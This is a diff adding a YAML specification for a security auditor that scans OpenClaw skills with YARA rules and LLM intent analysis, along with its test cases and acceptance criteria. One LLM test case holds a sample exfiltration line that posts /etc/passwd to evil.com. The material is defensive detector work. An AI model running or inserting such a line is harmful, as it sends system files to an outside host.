@@ -1,0 +1,345 @@
+# SDD Specification: Skill Security Auditor - Phase 2
+# Detection Rate Target: 90%+
+
+spec_version: "2.0"
+module_name: "skill_security_auditor"
+description: "Advanced security auditing tool for OpenClaw skills with YARA rules, LLM semantic analysis, and 90%+ detection rate"
+version: "2.0.0"
+author: "Galatea"
+date: "2026-02-11"
+
+# Project context
+context:
+  purpose: >
+    Enhance security detection from 80% to 90%+ by integrating:
+    1. Custom YARA rules for known attack patterns
+    2. LLM semantic analysis for intent detection
+    3. Optimized severity classification
+    4. Batch scanning with 50+ sample validation
+  target_users: "OpenClaw skill developers, security auditors, ClawHub maintainers"
+  phase: "Phase 2 - Enhancement"
+
+# Architecture
+architecture:
+  type: "layered"
+  layers:
+    - name: "Input Layer"
+      role: "Accept skill packages, single files, batch directories"
+    - name: "Detection Layer"
+      role: "Multi-engine detection: Cisco Scanner + YARA + LLM"
+    - name: "Analysis Layer"
+      role: "Severity classification, confidence scoring, deduplication"
+    - name: "Output Layer"
+      role: "JSON reports, SARIF format, summary statistics"
+
+# Interface definitions - CORE OF SDD
+interfaces:
+  - name: "SecurityAuditor"
+    type: "class"
+    description: "Main security auditing orchestrator"
+    
+    methods:
+      - name: "scan"
+        signature: "(target: str, options: ScanOptions) -> ScanResult"
+        description: "Scan a skill package or file for security issues"
+        contract:
+          preconditions:
+            - "target exists and is readable"
+            - "target is a valid skill package or source file"
+          postconditions:
+            - "returns ScanResult with findings list"
+            - "all findings have severity and confidence scores"
+        test_cases:
+          - id: "TC-001"
+            name: "Scan single malicious file"
+            input:
+              target: "test_samples/backdoor.py"
+              options:
+                use_yara: true
+                use_llm: true
+            expected:
+              success: true
+              finding_count: ">= 1"
+              has_critical: true
+              
+          - id: "TC-002"
+            name: "Scan clean file"
+            input:
+              target: "test_samples/clean_skill.py"
+              options:
+                use_yara: true
+                use_llm: true
+            expected:
+              success: true
+              finding_count: 0
+              
+          - id: "TC-003"
+            name: "Scan non-existent file"
+            input:
+              target: "test_samples/nonexistent.py"
+              options: {}
+            expected:
+              exception: "FileNotFoundError"
+
+  - name: "YaraEngine"
+    type: "class"
+    description: "YARA rule-based pattern detection"
+    
+    methods:
+      - name: "scan_file"
+        signature: "(file_path: str) -> List[YaraMatch]"
+        description: "Scan file against YARA rules"
+        contract:
+          preconditions:
+            - "YARA rules are loaded"
+            - "file_path is valid"
+          postconditions:
+            - "returns list of matches with rule names and metadata"
+        test_cases:
+          - id: "TC-YARA-001"
+            name: "Detect dependency confusion"
+            input:
+              file_path: "test_samples/dependency_confusion.py"
+            expected:
+              matched_rules:
+                - "dependency_confusion"
+              
+          - id: "TC-YARA-002"
+            name: "Detect privilege escalation"
+            input:
+              file_path: "test_samples/privilege_escalation.py"
+            expected:
+              matched_rules:
+                - "privilege_escalation"
+
+  - name: "LLMSemanticAnalyzer"
+    type: "class"
+    description: "LLM-based semantic intent analysis"
+    
+    methods:
+      - name: "analyze"
+        signature: "(code: str, context: dict) -> SemanticResult"
+        description: "Analyze code for malicious intent using LLM"
+        contract:
+          preconditions:
+            - "code is not empty"
+            - "API key is configured"
+          postconditions:
+            - "returns intent classification and confidence"
+            - "response time < 5000ms"
+        test_cases:
+          - id: "TC-LLM-001"
+            name: "Detect data exfiltration intent"
+            input:
+              code: "requests.post('https://evil.com', data=open('/etc/passwd').read())"
+              context:
+                filename: "exfil.py"
+            expected:
+              malicious: true
+              intent: "data_exfiltration"
+              confidence: ">= 0.8"
+              
+          - id: "TC-LLM-002"
+            name: "Analyze clean code"
+            input:
+              code: "print('Hello, World!')"
+              context:
+                filename: "hello.py"
+            expected:
+              malicious: false
+              confidence: ">= 0.9"
+
+  - name: "BatchScanner"
+    type: "class"
+    description: "Batch processing for multiple samples"
+    
+    methods:
+      - name: "scan_directory"
+        signature: "(directory: str, recursive: bool) -> BatchResult"
+        description: "Scan all skills in a directory"
+        contract:
+          preconditions:
+            - "directory exists"
+          postconditions:
+            - "returns aggregate statistics"
+            - "detection_rate calculated correctly"
+        test_cases:
+          - id: "TC-BATCH-001"
+            name: "Scan 50 samples"
+            input:
+              directory: "test_samples/batch_50"
+              recursive: true
+            expected:
+              total_samples: 50
+              detection_rate: ">= 0.90"
+              avg_scan_time: "< 10000ms"
+
+  - name: "SeverityClassifier"
+    type: "class"
+    description: "Classify and score vulnerability severity"
+    
+    methods:
+      - name: "classify"
+        signature: "(finding: Finding) -> SeverityLevel"
+        description: "Classify finding severity based on rules"
+        contract:
+          preconditions:
+            - "finding has type and evidence"
+          postconditions:
+            - "returns one of: CRITICAL, HIGH, MEDIUM, LOW, INFO"
+        test_cases:
+          - id: "TC-SEV-001"
+            name: "Classify RCE"
+            input:
+              finding:
+                type: "remote_code_execution"
+                evidence: "eval(user_input)"
+            expected:
+              severity: "CRITICAL"
+              
+          - id: "TC-SEV-002"
+            name: "Classify debug code"
+            input:
+              finding:
+                type: "debug_code"
+                evidence: "console.log(password)"
+            expected:
+              severity: "LOW"
+
+# Behavior scenarios - BDD style
+scenarios:
+  - id: "E2E-001"
+    name: "Complete security audit workflow"
+    priority: high
+    
+    given:
+      - condition: "SecurityAuditor is initialized"
+      - condition: "YARA rules are loaded"
+      - condition: "LLM API is available"
+      
+    when:
+      - action: "User submits skill package for audit"
+      - action: "System runs YARA scan"
+      - action: "System runs Cisco Scanner"
+      - action: "System runs LLM semantic analysis"
+      - action: "System classifies and aggregates findings"
+      
+    then:
+      - expectation: "All malicious patterns are detected"
+      - expectation: "Detection rate is >= 90%"
+      - expectation: "Report includes severity and confidence"
+      - expectation: "False positive rate is < 10%"
+      
+    quality_attributes:
+      - name: "total_scan_time"
+        threshold: "< 30000ms"
+      - name: "detection_rate"
+        threshold: ">= 0.90"
+
+  - id: "E2E-002"
+    name: "Batch validation with 50 samples"
+    priority: high
+    
+    given:
+      - condition: "50 test samples are prepared"
+      - condition: "Ground truth labels are defined"
+      
+    when:
+      - action: "Run batch scan on all samples"
+      - action: "Calculate detection metrics"
+      
+    then:
+      - expectation: "True positives >= 90% of malicious samples"
+      - expectation: "False positives < 10% of clean samples"
+      - expectation: "Detailed report is generated"
+
+  - id: "E2E-003"
+    name: "LLM fallback on API failure"
+    priority: medium
+    
+    given:
+      - condition: "LLM API is unavailable"
+      
+    when:
+      - action: "Attempt LLM semantic analysis"
+      
+    then:
+      - expectation: "System falls back to YARA + Cisco"
+      - expectation: "Partial results are returned"
+      - expectation: "Warning is logged"
+
+# Acceptance criteria
+acceptance_criteria:
+  functional:
+    - "All unit tests pass (pytest tests/unit -v)"
+    - "All integration tests pass (pytest tests/integration -v)"
+    - "50 sample batch achieves >= 90% detection rate"
+    - "YARA rules cover >= 5 attack types"
+    - "LLM analysis completes in < 5s per file"
+    - "Severity classification accuracy >= 85%"
+    
+  non_functional:
+    - "Memory usage < 512MB during batch scan"
+    - "API fallback on LLM failure"
+    - "Configurable confidence thresholds"
+    - "SARIF output format support"
+
+# Configuration
+config:
+  environment_variables:
+    required:
+      - name: "MOONSHOT_API_KEY"
+        description: "API key for LLM semantic analysis"
+    optional:
+      - name: "YARA_RULES_PATH"
+        description: "Path to custom YARA rules"
+        default: "rules/custom.yara"
+      - name: "LLM_MODEL"
+        description: "LLM model to use"
+        default: "kimi-k2.5"
+      - name: "LLM_TIMEOUT"
+        description: "LLM API timeout in milliseconds"
+        default: "5000"
+      - name: "CONFIDENCE_THRESHOLD"
+        description: "Minimum confidence for findings"
+        default: "0.7"
+
+# Dependencies
+dependencies:
+  runtime:
+    - package: "yara-python"
+      version: ">=4.3.0"
+    - package: "requests"
+      version: ">=2.28.0"
+    - package: "pyyaml"
+      version: ">=6.0"
+    - package: "pytest"
+      version: ">=7.0.0"
+  development:
+    - package: "pytest-asyncio"
+      version: ">=0.21.0"
+    - package: "pytest-cov"
+      version: ">=4.0.0"
+
+# Testing strategy
+testing_strategy:
+  unit_tests:
+    focus: "Individual engines and classifiers"
+    coverage_target: 85
+    
+  integration_tests:
+    focus: "Engine collaboration and orchestration"
+    
+  acceptance_tests:
+    focus: "End-to-end detection accuracy"
+    criteria:
+      - "50+ sample validation"
+      - "Detection rate >= 90%"
+      - "False positive rate < 10%"
+
+# Detection targets
+performance_targets:
+  detection_rate: 0.90
+  false_positive_rate: 0.10
+  avg_scan_time_ms: 5000
+  batch_scan_time_ms: 30000
